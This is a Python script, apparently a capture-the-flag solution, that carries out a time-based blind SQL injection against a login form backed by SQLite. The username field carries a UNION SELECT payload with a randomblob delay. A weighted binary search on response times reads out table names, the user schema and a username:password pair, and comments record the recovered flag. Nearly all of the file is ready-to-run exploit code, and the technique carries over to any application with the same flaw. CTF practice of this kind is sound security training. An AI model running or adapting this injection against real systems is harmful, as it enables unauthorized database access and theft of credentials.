#!/usr/bin/env python3

import requests
import time

# the commented values are "safer" and were what I used during the CTF
# however, the flag exfiltration worked with the uncommented set of
# values as well (not on the first try, though), which was faster
#TIME_TRIG = 6
#TIME_TOL = 3

TIME_TRIG = 3
# 300000000 for roughly 3 seconds
TIME_TOL = 1

#BIN_WEIGHT = 9 / 10
BIN_WEIGHT = 1 / 2

def req(s):
    print("req", s)
    t = time.time()
    r = requests.post("http://127.0.0.1:4008/add", data={"username": s, "password": "a"})
    dt = time.time() - t
    return r, dt

# time-based boolean
def timereq(s):
    while True:
        r, dt = req(s)
        if r.status_code == 200:
            # print(dt)
            if 0 <= dt <= TIME_TRIG:
                return False
            elif TIME_TRIG <= dt <= TIME_TRIG + TIME_TOL:
                return True
        else:
            print(f"Status {r.status_code}!")
        print(f"Resend! ({dt})")
        

# get an integer value via a weighted binary search
def binsearch(s, mi, ma):
    while mi + 1 < ma:
        mid = int(mi * (1 - BIN_WEIGHT) + ma * BIN_WEIGHT)
        if timereq(s.format(comp=f"< {mid}")):
            ma = mid
        else:
            mi = mid
    return mi

condBase = f"') UNION SELECT 1, CASE WHEN {{st}} {{{{comp}}}} THEN randomblob({TIME_TRIG} * 100000000) END {{st2}};-- -"

# get a string character by character
def getString(st, st2):
    # get length
    s = condBase.format(st=f"length({st})", st2=f"{st2}")
    l = binsearch(s, 0, 128)
    print(f"length: {l}")
    
    # get characters
    res = ""
    for i in range(1, l + 1):
        s = condBase.format(st=f"unicode(substr({st}, {i}, 1))", st2=f"{st2}")
        c = chr(binsearch(s, 0, 128))
        print(f"char: {c}")
        res += c
    return res
    



print("* tables", getString("min(tbl_name)", "FROM sqlite_master"))
# tables user
print("* columns", getString("group_concat(sql)", "FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='user'"))
# * columns CREATE TABLE "user" ("id" INTEGER NOT NULL PRIMARY KEY, "password" VARCHAR(255) NOT NULL, "username" VARCHAR(255) NOT NULL)
print("* username, password", getString("group_concat(username || ':' || password)", "FROM user WHERE username='shou'"))
# * username, password shou:we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P}